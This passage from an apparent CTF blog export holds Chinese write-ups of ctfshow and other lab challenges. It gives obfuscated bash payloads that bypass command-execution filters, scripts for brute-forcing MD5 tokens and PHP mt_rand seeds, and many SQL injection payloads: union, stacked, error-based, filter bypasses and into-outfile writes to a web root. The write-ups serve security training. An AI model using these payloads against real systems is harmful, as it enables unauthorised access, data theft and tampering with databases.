<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf_show=$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;00$&#123;##&#125;00))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;000))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;00$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;00$&#123;##&#125;0))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;0))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;00$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure>



<h2 id="极限命令执行5"><a href="#极限命令执行5" class="headerlink" title="极限命令执行5"></a>极限命令执行5</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//本题灵感来自研究一直没做出来的某赛某题时想到的姿势，太棒啦~。</span><br><span class="line">//flag在根目录flag里</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include &quot;check.php&quot;;</span><br><span class="line">if (isset($_POST[&#x27;ctf_show&#x27;])) &#123;</span><br><span class="line">    $ctfshow = $_POST[&#x27;ctf_show&#x27;];</span><br><span class="line">    check($ctfshow);</span><br><span class="line">    system($ctfshow);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>fuzz一下，还剩 <code>! $ &amp; &#39; ()&lt;+\-&#123;&#125;~</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $(())</span><br><span class="line">结果为0</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf_show=__=$(())%26%26$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$(())\\$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.cnblogs.com/GTL-JU/p/17128363.html">ctfshow-极限命令执行复现 - GTL_JU - 博客园 (cnblogs.com)</a></p>
]]></content>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>爆破</title>
    <url>/2023/04/29/%E7%88%86%E7%A0%B4/</url>
    <content><![CDATA[<p>ctfshow 爆破</p>
<span id="more"></span>

<h2 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">if(isset($_GET[&#x27;token&#x27;]))&#123;</span><br><span class="line">    $token = md5($_GET[&#x27;token&#x27;]);</span><br><span class="line">    if(substr($token, 1,1)===substr($token, 14,1) &amp;&amp; substr($token, 14,1) ===substr($token, 17,1))&#123;</span><br><span class="line">        if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1)))&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>爆破脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;asdfghjklqwertyuiopzxcvbnm1234567890&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">36</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="number">36</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">        <span class="variable">$token</span>=<span class="variable">$a</span>[<span class="variable">$i</span>].<span class="variable">$a</span>[<span class="variable">$j</span>];</span><br><span class="line">        <span class="variable">$token</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$token</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$a</span>[<span class="variable">$i</span>].<span class="variable">$a</span>[<span class="variable">$j</span>];</span><br><span class="line">                <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="number">3</span>j</span><br></pre></td></tr></table></figure>

<h2 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">if(isset($_GET[&#x27;r&#x27;]))&#123;</span><br><span class="line">    $r = $_GET[&#x27;r&#x27;];</span><br><span class="line">    mt_srand(372619038);</span><br><span class="line">    if(intval($r)===intval(mt_rand()))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    echo system(&#x27;cat /proc/version&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mt_srand() //播种 Mersenne Twister 随机数生成器。</span><br><span class="line">mt_rand()   //生成随机数</span><br></pre></td></tr></table></figure>

<p>我们会发现当种子不变时，实际上生成的随机数是固定的。而这就是伪随机数漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(372619038);</span><br><span class="line">echo (mt_rand());</span><br><span class="line">1155388967</span><br></pre></td></tr></table></figure>

<h2 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">if(isset($_GET[&#x27;r&#x27;]))&#123;</span><br><span class="line">    $r = $_GET[&#x27;r&#x27;];</span><br><span class="line">    mt_srand(hexdec(substr(md5($flag), 0,8)));</span><br><span class="line">    $rand = intval($r)-intval(mt_rand());</span><br><span class="line">    if((!$rand))&#123;</span><br><span class="line">        if($_COOKIE[&#x27;token&#x27;]==(mt_rand()+mt_rand()))&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo $rand;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    echo system(&#x27;cat /proc/version&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>已知随机数爆破种子</p>
<p>使用工具<a href="https://www.openwall.com/php_mt_seed/">php_mt_seed - PHP mt_rand() seed cracker (openwall.com)</a></p>
<p><a href="https://www.openwall.com/php_mt_seed/php_mt_seed-4.0.tar.gz">php_mt_seed 4.0</a></p>
<p>下载解压，进入目录</p>
<ul>
<li>make</li>
<li>time .&#x2F;php_mt_seed 989670016</li>
</ul>
<p><img src="/2023/04/29/%E7%88%86%E7%A0%B4/QQ%E6%88%AA%E5%9B%BE20230501185137.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">2838855227</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">mt_rand</span>()).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"><span class="number">989670016</span></span><br><span class="line"><span class="number">3064661505</span></span><br></pre></td></tr></table></figure>

<p>&#x2F;?r&#x3D;989670016</p>
<p>cookie: token&#x3D;3064661505</p>
<h2 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h2><p>爆破即可</p>
<p>密码 7758521</p>
<h2 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h2><p>抓不到包。。。写不了</p>
<h2 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h2><p>继续爆破一下目录</p>
<p><code>[1cd8c3a3-5c30-4219-93aa-489569d67004.challenge.ctf.show/0/1/2.txt](http://1cd8c3a3-5c30-4219-93aa-489569d67004.challenge.ctf.show/0/1/2.txt)</code></p>
<p>去掉2.txt</p>
<p>集束炸弹 cluster bomb 爆破一一下</p>
<p>爆破结果&#x2F;72&#x2F;20&#x2F;</p>
<h2 id="ctfshow萌新杯web16"><a href="#ctfshow萌新杯web16" class="headerlink" title="ctfshow萌新杯web16"></a>ctfshow萌新杯web16</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">\<span class="comment"># flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="string">&quot;ctfshow<span class="subst">$c</span>&quot;</span>)===<span class="string">&quot;a6f57ae38a22448c2f07f3f95f49c84e&quot;</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;nonono!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>解题思路</p>
<p>mport hashlib #建立爆破的字典str str&#x3D;’abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890+-*&#x2F;‘ #从一个字符开始尝试，逐渐往下加 for i in str: for j in str : for k in str: s&#x3D;hashlib.md5((‘ctfshow’+i+j+k).encode()).hexdigest() #让ctfshow和字符i,j,k拼接在一起，转化为MD5值，hexdigest函数实现字符存储 if s&#x3D;&#x3D; ‘a6f57ae38a22448c2f07f3f95f49c84e’:#判断值是否符合条件 print(i+j+k)#输出字符c的值 脚本输出36d 构造payload: ?c&#x3D;36d 得出flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">str1=&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="line">payload=&#x27;&#x27;</span><br><span class="line">for i in str1:</span><br><span class="line">    for j in str1:</span><br><span class="line">        for k in str1:</span><br><span class="line">            s = hashlib.md5((&#x27;ctfshow&#x27;+i+j+k).encode()).hexdigest()</span><br><span class="line">            #print(type(s))</span><br><span class="line">            if s==&#x27;a6f57ae38a22448c2f07f3f95f49c84e&#x27;:</span><br><span class="line">                print(i+j+k)</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import string</span><br><span class="line">a=string.ascii_letters+string.digits</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>ctfhsow</tag>
      </tags>
  </entry>
  <entry>
    <title>easysql</title>
    <url>/2023/03/23/%E7%AE%80%E5%8D%95sql/</url>
    <content><![CDATA[<p> 我是菜狗。</p>
  <span id="more"></span>

<p>[toc]</p>
<h2 id="mysql-information-schema"><a href="#mysql-information-schema" class="headerlink" title="mysql-information_schema"></a>mysql-information_schema</h2><p>查看数据库，在<strong>schemata</strong>表中，<strong>schema_name</strong>字段中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select schema_name from information_schema.schemata</span><br></pre></td></tr></table></figure>

<p>查看数据库的表名 ，在<strong>tables</strong>表中，<strong>table_name</strong>字段中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=&#x27;数据库名&#x27;</span><br></pre></td></tr></table></figure>

<p>猜表的列名，在<strong>columns</strong>表中，<strong>column_name</strong>字段中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Select column_name from information_schema.columns where table_name=&#x27;数据表名&#x27;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.cnblogs.com/Lee-404/p/12833788.html">无列名注入 - Lee-404 - 博客园 (cnblogs.com)</a></p>
<h2 id="union-联合注入"><a href="#union-联合注入" class="headerlink" title="union 联合注入"></a>union 联合注入</h2><p>依次判断类型，字段数，回显点，依次爆库名，表名，字段名，数据<br>union有一个十分严格的约束条件，因为是联合查询，必选保证字段数一致，即两个查询结果有相同的列数，因此我们要对字段数进行判断</p>
<p>ctfshow web2;</p>
<p>查看当前数据库名称</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 union select 1,database(),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p>查看数据库表的数量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 union select 1,(select count(*) from information_schema.tables where table_schema = &#x27;web2&#x27;),3 limit 1,2;#--</span><br></pre></td></tr></table></figure>

<p>数量为2</p>
<p>查第一个表的名字，**第一个表:**flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 union select 1,(select table_name from information_schema.tables where table_schema = &#x27;web2&#x27; limit 0,1),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p><strong>查flag表列的数量</strong>,</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 union select 1,(select count(*) from information_schema.columns where table_name = &#x27;flag&#x27; limit 0,1),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p><strong>查flag表列的名字</strong>   <em>列名为flag</em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 union select 1,(select column_name from information_schema.columns where table_name = &#x27;flag&#x27; limit 0,1),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p><strong>查flag表记录的数量</strong>        数量为1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 union select 1,(select count(*) from flag),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p><strong>查flag表记录值</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 union select 1,(select flag from flag limit 0,1),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

<p>1’ union select 1,password from ctfshow_user5 where username&#x3D;’flag’ into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;ctf.txt’ – A#生成并保存在网页目录下ctf.txt文件#ctfshowweb175</p>
<p>  if(!preg_match(‘&#x2F;[\x00-\x7f]&#x2F;i’, json_encode($ret))){<br>      $ret[‘msg’]&#x3D;’查询成功’;<br>    }<br>sql 字符注入绕过 空格 %09(tab) %20( )注释绕过&#x2F;**&#x2F;%0a%0b%0c<br> return preg_match(‘&#x2F; |*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|#|file|into|select&#x2F;i’, $str);<br>%23(#) </p>
<p>-1’or(id&#x3D;26)and’a’&#x3D;’a           #括号绕过空格 ctfshow180<br>-1’ or username &#x3D; ‘flag’ –+</p>
<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>攻防世界supersqli</p>
<h3 id="查看字段"><a href="#查看字段" class="headerlink" title="查看字段"></a>查看字段</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by  2 #</span><br></pre></td></tr></table></figure>

<p>查看数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;show databases;--+</span><br></pre></td></tr></table></figure>

<p>查表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;;use supersqli;show tables;#</span><br></pre></td></tr></table></figure>

<p>查字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; show columns from `1919810931114514` ;--+</span><br></pre></td></tr></table></figure>

<p>发现flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; show columns from `words` ;--+</span><br></pre></td></tr></table></figure>



<p>handler查询</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1’;handler 1919810931114514 open;handler 1919810931114514 read first;#</span><br></pre></td></tr></table></figure>

<p> 1、打开句柄</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handler handler_table open;</span><br></pre></td></tr></table></figure>

<h3 id="查看数据"><a href="#查看数据" class="headerlink" title="查看数据"></a>查看数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handler handler_table read first; //获取第一行</span><br><span class="line">handler handler_table read next; //获取下一行</span><br></pre></td></tr></table></figure>

<p>或者通过改表名</p>
<p>根据在words表里发现id字段与查询框里的出的数据类型相同，一个数字，一个字符串，所以猜测默认查询的就是words表，inject（搜索框中）值应该赋给了id<br>利用：我们可以将含有flag字段的表命名为word，然后修改字段名字，不就查询到我们想要的结果！（前提是这里rename，alert关键字 没有做过滤）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 ; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50); #</span><br><span class="line"> 拆开：</span><br><span class="line">1;  alter tables words rename to words1; </span><br><span class="line">1;  alter tables `1919810931114514` rename to words ;</span><br><span class="line">1;  alter tables words change flag id varchar(50); #</span><br></pre></td></tr></table></figure>

<p>万能密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or 1=1 #</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;c168d583ed0d4d7196967b28cbd0b5e9&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/l2872253606/article/details/123362430">(5条消息) 攻防世界之supersqli_攻防世界supersqli_金 帛的博客-CSDN博客</a></p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>利用xpath语法错误来进行报错注入主要利用<code>extractvalue</code>和<code>updatexml</code>两个函数</p>
<p>extractvalue函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">函数原型：extractvalue(xml_document,Xpath_string)</span><br><span class="line">正常语法：extractvalue(xml_document,Xpath_string);</span><br><span class="line">第一个参数：xml_document是string格式，为xml文档对象的名称</span><br><span class="line">第二个参数：Xpath_string是xpath格式的字符串</span><br><span class="line">作用：从目标xml中返回包含所查询值的字符串</span><br></pre></td></tr></table></figure>

<p> ① 0x7e&#x3D;’<del>’<br> ② concat(‘a’,‘b’)&#x3D;“ab”<br> ③ version()&#x3D;@@version<br> ④ ‘</del>‘可以换成’#’、’$’等不满足xpath格式的字符<br> ⑤ extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位</p>
<p>updatexml函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">函数原型：updatexml(xml_document,xpath_string,new_value)</span><br><span class="line">正常语法：updatexml(xml_document,xpath_string,new_value)</span><br><span class="line">第一个参数：xml_document是string格式，为xml文档对象的名称 第二个参数：xpath_string是xpath格式的字符串</span><br><span class="line">第三个参数：new_value是string格式，替换查找到的负荷条件的数据 作用：改变文档中符合条件的节点的值</span><br></pre></td></tr></table></figure>



<p><a href="https://blog.csdn.net/silence1_/article/details/90812612">(8条消息) sql注入之报错注入_Dar1in9的博客-CSDN博客</a></p>
<h3 id="SWPUCTF-2021-新生赛-error"><a href="#SWPUCTF-2021-新生赛-error" class="headerlink" title="[SWPUCTF 2021 新生赛]error"></a>[SWPUCTF 2021 新生赛]error</h3><p>nssctf的题</p>
<p>爆出数据库 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;and(select extractvalue(1,concat(&#x27;~&#x27;,(select database()))))#</span><br></pre></td></tr></table></figure>

<p>爆出所有数据库名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;and(select extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(schema_name) from information_schema.schemata))))#</span><br></pre></td></tr></table></figure>

<p>爆出数据库test_db下所有的表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;and(select extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;test_db&#x27;))))#</span><br></pre></td></tr></table></figure>

<p>爆出test_db数据库下test_tb表所有的列名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;and(select extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&quot;test_tb&quot; and table_schema=&#x27;test_db&#x27;))))#</span><br></pre></td></tr></table></figure>

<p>查询flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;and(select extractvalue(1,concat(&#x27;~&#x27;,(select substr((select flag from test_tb), 1 , 31)))))#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;and(select extractvalue(1,concat(&#x27;~&#x27;,(select substr((select flag from test_tb), 31 , 60)))))#</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>sql</category>
      </categories>
  </entry>
</search>
